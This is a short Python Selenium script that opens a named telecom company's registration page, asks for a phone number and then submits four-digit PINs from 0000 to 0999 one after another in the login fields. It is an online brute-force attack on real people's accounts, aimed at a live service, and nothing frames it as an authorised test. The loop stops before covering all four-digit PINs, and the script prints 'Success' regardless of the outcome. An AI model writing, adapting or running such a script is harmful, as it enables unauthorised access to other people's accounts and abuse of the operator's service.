from selenium import webdriver
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium. webdriver. common. keys import Keys
from selenium.webdriver.common.by import By
import time

browser=webdriver.Firefox()
browser.get("https://www.chinguitel.mr/new_site/register.php")

name = input("Escribe numero de telefono: ")

i = 0
while i < 1000:
        
    element=browser.find_element(By.ID,"phone")
    element.send_keys(name)
    element=browser.find_element(By.ID,"pass")
    
    newi = "{:04d}".format(i)
    password = '' + str(newi)
    element.send_keys(password)
    element.submit()
    print(password)
    time.sleep(3)
    print(browser.current_url)
    browser.get(browser.current_url)
    i += 1

print("Success")
